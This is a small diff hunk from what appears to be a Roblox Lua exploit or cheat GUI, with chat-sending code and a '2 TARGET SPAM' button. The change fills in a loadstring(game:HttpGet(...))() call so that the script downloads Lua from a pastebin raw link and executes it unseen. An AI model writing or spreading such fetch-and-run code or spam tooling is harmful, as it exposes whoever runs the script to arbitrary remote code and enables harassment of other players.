@@ -2171,7 +2171,7 @@ if channel then
         channel:SendAsync(message)
     end)
 		end			
-loadstring(game:HttpGet(""))()end)
+loadstring(game:HttpGet("https://pastebin.com/raw/uyiHJZLs"))()end)
 
 
 btn("2 TARGET SPAM 😤💢",P5,function()
